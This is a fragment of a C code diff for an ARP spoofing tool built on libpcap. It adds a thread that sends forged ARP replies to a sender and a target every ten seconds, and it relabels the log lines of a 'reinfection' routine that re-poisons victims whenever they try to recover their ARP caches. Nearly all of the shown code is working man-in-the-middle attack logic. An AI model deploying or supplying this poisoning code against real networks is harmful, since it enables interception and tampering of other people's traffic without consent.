@@ -98,7 +98,7 @@ bool GET_SENDER_MAC(uint8_t *sender_MAC_array, int sender_IP_int, pcap_t *handle
 	time_t start = time(NULL);
 	while (1)
 	{
-		if (time(NULL) > start + 5) { break; }
+		if (time(NULL) > start + 3) { break; }
 	
 		int res = pcap_next_ex(handle, &header, &packet);
 
@@ -120,6 +120,29 @@ bool GET_SENDER_MAC(uint8_t *sender_MAC_array, int sender_IP_int, pcap_t *handle
 	}
 
 	return 0; 
+}
+
+void *SEND_ARP(void *info)
+{
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t *handle = pcap_open_live(((my_args_struct *)info)->dev, BUFSIZ, 1, 1000, errbuf);
+
+	if (handle == NULL)
+	{
+		fprintf(stderr, "[-] Couldn't open device %s: %s\n", ((my_args_struct *)info)->dev, errbuf);
+		puts("[*] Exiting program with -1");
+		exit(EXIT_FAILURE);
+	}
+
+	while (1)
+	{
+		pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr)); puts("[  PROD  ] sender <- attacker    target");
+		pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr)); puts("[  PROD  ] sender    attacker -> target");
+
+		sleep(10);
+	}
+
+	return NULL;
 }
 
 void *BLOCK_RECOVERY(void *info)
@@ -155,16 +178,17 @@ void *BLOCK_RECOVERY(void *info)
 		
 		if ((PCKT_ARPSPA == ((my_args_struct *)info)->sender_IP_int) && (PCKT_ARPTPA == ((my_args_struct *)info)->target_IP_int))
 		{
-			pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr)); puts("sender <- attacker    target : reinfection");
+			pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2sender, sizeof(my_etharp_hdr)); puts("[  RINF  ] sender <- attacker    target");
 			continue;
 		}
 
 		if ((PCKT_ARPSPA == ((my_args_struct *)info)->target_IP_int) && (PCKT_ARPTPA == ((my_args_struct *)info)->sender_IP_int))
 		{
-			pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr)); puts("sender    attacker -> target : reinfection");
+			pcap_sendpacket(handle, ((my_args_struct *)info)->arp_reply2target, sizeof(my_etharp_hdr)); puts("[  RINF  ] sender    attacker -> target");
 			continue;
 		}
 	}
+
 	free(header);
 
 	return NULL;
